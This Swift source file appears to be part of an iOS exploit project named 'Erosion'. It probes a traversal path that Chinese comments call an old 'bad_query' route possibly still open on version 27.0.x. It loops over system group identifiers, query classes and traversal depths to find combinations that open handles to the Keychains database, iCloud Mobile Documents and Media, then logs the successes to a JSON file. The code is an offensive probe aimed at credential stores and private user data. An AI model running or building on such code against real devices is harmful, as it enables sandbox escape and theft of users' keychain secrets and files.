//
//  GrantMatrix.swift
//  Erosion
//
//  class-13 / class-12 partDomain 穿越探测（老 bad_query 路径，27.0.x 可能仍开放）
//  目标：/var/Keychains、Mobile Documents、Media
//  结果写 Documents/grant-matrix-result.json
//

import Foundation

enum GrantMatrix {
    static let targets = [
        "/private/var/Keychains/keychain-2.db",
        "/private/var/Keychains",
        "/private/var/mobile/Library/Mobile Documents",
        "/private/var/mobile/Media"
    ]

    static let identifiers = [
        "systemgroup.com.apple.mobilegestaltcache",
        "systemgroup.com.apple.configurationprofiles",
        "systemgroup.com.apple.trustd"
    ]

    static func run(group: String) {
        let url = URL.documentsDirectory.appendingPathComponent("grant-matrix-result.json")
        var all: [[String: Any]] = []

        for target in targets {
            var granted: [[String: Any]] = []
            for identifier in identifiers {
                for queryClass in [13, 12, 7] {
                    for up in [6, 8, 10, 12] {
                        let handle = worse_query_traverse(target, group, identifier, UInt64(queryClass), 3, Int32(up))
                        if handle >= 0 {
                            granted.append([
                                "identifier": identifier,
                                "class": queryClass,
                                "up": up,
                                "handle": handle
                            ])
                            worse_query_release(handle)
                        }
                    }
                }
            }
            all.append(["target": target, "granted": granted])
            let payload: [String: Any] = [
                "at": ISO8601DateFormatter().string(from: Date()),
                "progress": all.count,
                "total": targets.count,
                "results": all
            ]
            if let data = try? JSONSerialization.data(withJSONObject: payload, options: [.prettyPrinted, .sortedKeys]) {
                try? data.write(to: url)
            }
            print("(traverse) \(target) -> \(granted.count) 个组合成功")
        }

        let final: [String: Any] = ["at": ISO8601DateFormatter().string(from: Date()), "done": true, "results": all]
        if let data = try? JSONSerialization.data(withJSONObject: final, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: url)
        }
        print("(traverse) 完成")
    }
}
